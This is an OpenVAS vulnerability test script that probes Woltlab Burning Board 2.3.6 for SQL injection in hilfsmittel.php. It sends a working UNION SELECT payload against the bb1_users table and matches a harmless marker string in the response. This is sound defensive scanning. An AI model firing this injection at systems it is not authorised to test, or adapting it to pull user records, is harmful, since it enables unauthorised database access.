###############################################################################
# OpenVAS Vulnerability Test
#
# Woltlab Burning Board 'hilfsmittel.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:woltlab:burning_board";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103089");
  script_version("2020-05-08T08:34:44+0000");
  script_tag(name:"last_modification", value:"2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)");
  script_tag(name:"creation_date", value:"2011-02-23 13:14:43 +0100 (Wed, 23 Feb 2011)");
  script_bugtraq_id(46501);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Woltlab Burning Board 'hilfsmittel.php' SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("secpod_woltlab_burning_board_detect.nasl");
  script_mandatory_keys("WoltLabBurningBoard/detected");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/46501");
  script_xref(name:"URL", value:"http://www.woltlab.com/de/");

  script_tag(name:"summary", value:"Woltlab Burning Board is prone to an SQL-injection vulnerability
  because the application fails to properly sanitize user-supplied input before using it in an SQL query.");

  script_tag(name:"impact", value:"A successful exploit could allow an attacker to compromise the
  application, access or modify data, or exploit vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"Woltlab Burning Board 2.3.6 is vulnerable. Other versions may also
  be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";
url = dir + "/hilfsmittel.php?action=read&katid=5%27/**/UNION/**/SELECT/**/1,2,0x53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10/**/FROM/**/bb1_users/*";
if( http_vuln_check( port:port, url:url, pattern:"SQL-Injection-Test" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
